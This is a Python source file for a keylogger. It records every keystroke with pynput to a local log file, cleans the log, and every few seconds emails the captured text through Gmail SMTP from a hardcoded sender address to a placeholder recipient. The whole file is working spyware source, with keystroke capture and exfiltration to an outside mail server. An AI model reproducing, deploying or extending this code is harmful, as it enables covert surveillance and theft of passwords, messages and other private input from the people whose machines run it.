import logging
import os
from pynput import keyboard
import time
import smtplib
import codecs


# create log file
PATH = os.getcwd()
print(PATH + '\\log.txt')

if os.path.exists(PATH + '\\log.txt'):
    os.remove(PATH + '\\log.txt')
log_file = os.path.join(PATH, 'log.txt')
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


# function to handle key press event
def on_press(key):
    global start_time
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(key)

    elapsed_time = time.time() - start_time
    if elapsed_time > 5:
        print(elapsed_time)
        start_time = time.time()
        reformat_keylogger_file('log.txt')
        send_email('URMMAIL')


def reformat_keylogger_file(file):
    # 2023-04-19 16:53:05,751: t
    # 2023-04-19 16:53:07,050: m
    # 2023-04-19 16:53:07,050: e
    # 2023-04-19 16:53:56,135: t
    # 2023-04-19 16:53:57,548: t
    # 2023-04-19 16:53:57,548: t
    # 2023-04-19 16:53:57,549: e
    # 2023-04-19 16:53:57,549: s
    # 2023-04-19 16:53:57,549: t
    with open(log_file, "r") as file:
        file_string = file.read()

    ###############
    lines = file_string.splitlines()
    lines = [x[25:] for x in lines]
    lines = [word.replace("Key.space", " ") if "Key.space" in word else word for word in lines]
    lines = [word for word in lines if not word.startswith("Key.backspace")]

    file_string = ''.join(lines)
    print(file_string)
    #############
    with codecs.open(log_file, "w", encoding="utf-8") as file:
        file.write(file_string)


def send_email(recipient):
    # Set up the connection to the email server
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    smtp_username = 'kw5t452005@gmail.com'
    smtp_password = 'URAPPPASS'

    with open(log_file, "r") as file:
        file_string = file.read()

    with smtplib.SMTP(smtp_server, smtp_port) as smtp:
        smtp.starttls()
        smtp.login(smtp_username, smtp_password)

        # Compose the email message
        subject = 'Test email'
        body = file_string
        email_message = f'Subject: {subject}\n\n{body}'

        # Send the email
        smtp.sendmail(smtp_username, recipient, email_message)


start_time = time.time()

# create keyboard listener - main forever loop
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
